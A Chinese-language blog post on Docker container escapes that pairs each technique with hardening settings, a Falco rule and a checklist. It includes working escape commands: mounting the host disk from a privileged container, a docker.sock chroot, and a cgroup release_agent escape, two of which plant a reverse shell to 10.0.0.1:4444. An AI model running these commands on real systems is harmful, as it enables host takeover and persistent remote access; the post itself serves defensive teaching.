---
title: "Docker 容器逃逸的常见姿势与防护配置"
date: 2026-08-28
lastmod: 2026-08-28
description: "梳理特权容器、挂载 docker.sock、cgroup release_agent、内核漏洞四类逃逸手法，并给出可直接落地的加固清单。"
author: "Tanglx"
tags: ["Docker", "容器安全", "逃逸"]
categories: ["主机加固"]
cover: "/img/cover/container.svg"
toc: true
---

容器不是沙箱。只要配置不当，从容器里拿到宿主机 root 往往只需要几条命令。这篇按逃逸手法分类，给出验证命令和对应的加固配置。

##  reconnaissance：先判断自己在哪

进到一个容器里，第一件事是确认环境：

```bash
# 是否在容器里
cat /proc/1/cgroup | grep -qi docker && echo "in docker"
ls -l /.dockerenv 2>/dev/null

# 是否特权容器（CapEff 为 0000003fffffffff 基本就是）
grep CapEff /proc/self/status

# 可用的 capabilities
capsh --print 2>/dev/null || cat /proc/self/status | grep -i cap
```

| 检查项 | 危险信号 |
| --- | --- |
| `CapEff` = `3fffffffff` | 特权容器，逃逸难度极低 |
| 存在 `/var/run/docker.sock` | 可直接操控宿主机 Docker |
| 挂载了 `/` 或 `/proc/sys` | 可写宿主机文件系统 |
| `--pid=host` | 能看到并注入宿主机进程 |

## 手法一：特权容器挂载宿主机磁盘

特权容器里能直接看到宿主机磁盘设备：

```bash
# 列出可用磁盘
fdisk -l

# 找到宿主机根分区并挂载
mkdir /tmp/host && mount /dev/sda1 /tmp/host

# 写入定时任务完成持久化
echo '* * * * * root bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"' \
  >> /tmp/host/etc/crontab
```

**加固**：永远不要 `--privileged`。必须时用 `--cap-add` 精确授权：

```bash
# 错误
docker run --privileged -d app:latest

# 正确：只给需要的 capability
docker run -d --cap-drop=ALL --cap-add=NET_BIND_SERVICE app:latest
```

## 手法二：挂载 docker.sock

这可能是最常见的错误配置：

```bash
# 容器内直接创建特权容器，把宿主机根目录挂进去
docker -H unix:///var/run/docker.sock run -it --rm \
  -v /:/host alpine chroot /host bash
```

**加固**：

```bash
# 1. 不要挂载 socket；CI 场景改用 Docker Socket Proxy 做接口白名单
docker run -d --name docker-proxy \
  -v /var/run/docker.sock:/var/run/docker.sock:ro \
  -e CONTAINERS=1 tecnativa/docker-socket-proxy

# 2. 或者在容器内使用 rootless / dind + 更严格的授权
```

## 手法三：cgroup release_agent

需要 `CAP_SYS_ADMIN + SYS_PTRACE`，且 cgroup v1：

```bash
# 1. 挂载 cgroup 并创建子组
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x

# 2. 启用 notify_on_release
echo 1 > /tmp/cgrp/x/notify_on_release

# 3. 指定宿主机上执行的脚本
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab | head -1)
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# 4. 写入 payload
echo '#!/bin/sh' > /cmd
echo "bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'" >> /cmd
chmod +x /cmd

# 5. 触发：进程退出即执行
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

**加固**：使用 cgroup v2、容器以非特权运行、启用 user namespace remap。

```bash
# /etc/docker/daemon.json
{
  "userns-remap": "default",
  "no-new-privileges": true,
  "seccomp-profile": "/etc/docker/seccomp-default.json"
}
```

## 手法四：内核漏洞（Dirty Pipe 等）

内核层面的漏洞，容器隔离基本无效：

```text
CVE-2022-0847  Dirty Pipe     Linux 5.8 ~ 5.16/5.17  覆盖只读文件
CVE-2021-4034  PwnKit         Polkit                 本地提权
CVE-2022-0185  fsconfig       Linux 5.1+             heap overflow
CVE-2024-1086  nf_tables      Linux 5.x              释放后重用
```

验证内核版本：

```bash
uname -a
cat /proc/version
```

**加固**：及时打补丁只是底线，更重要的是**运行时检测**：

```bash
# 用 Falco 检测容器内的异常行为
- rule: Container Drift Detected
  desc: 容器内出现可执行文件写入
  condition: >
    container.id != host and
    evt.type in (open, openat, openat2) and
    evt.is_open_write=true and
    fd.typechar='f' and
    fd.directory in (/bin, /sbin, /usr/bin, /usr/sbin)
  output: "可执行文件写入 (user=%user.name container=%container.name file=%fd.name)"
  priority: WARNING
```

## 加固清单（可直接抄）

```bash
# 1. 以非 root 用户运行
docker run -d --user 10001:10001 app:latest

# 2. 只读根文件系统 + 临时目录
docker run -d --read-only --tmpfs /tmp:rw,noexec,nosuid,size=64m app:latest

# 3. 禁止提权
docker run -d --security-opt no-new-privileges app:latest

# 4. 资源限制，防止挖矿榨干宿主机
docker run -d --memory 512m --cpus 0.5 --pids-limit 100 app:latest

# 5. 网络隔离
docker network create --internal secure-net
docker run -d --network secure-net app:latest
```

用 gVisor 或 Kata Containers 做额外隔离层：

```bash
docker run --runtime=runsc -d app:latest
```

## 总结

| 手法 | 前置条件 | 加固手段 |
| --- | --- | --- |
| 特权容器 | `--privileged` | 禁用特权，最小化 capability |
| docker.sock | 挂载 socket | 禁止挂载，改用受限代理 |
| release_agent | cgroup v1 + SYS_ADMIN | 升级 cgroup v2，启用 userns |
| 内核漏洞 | 未打补丁的内核 | 及时更新 + 运行时检测 |

容器安全的核心就一句话：**默认拒绝，按需授权**。


## 故意损坏资源验证

![损坏图片](/images/not-exist.png)
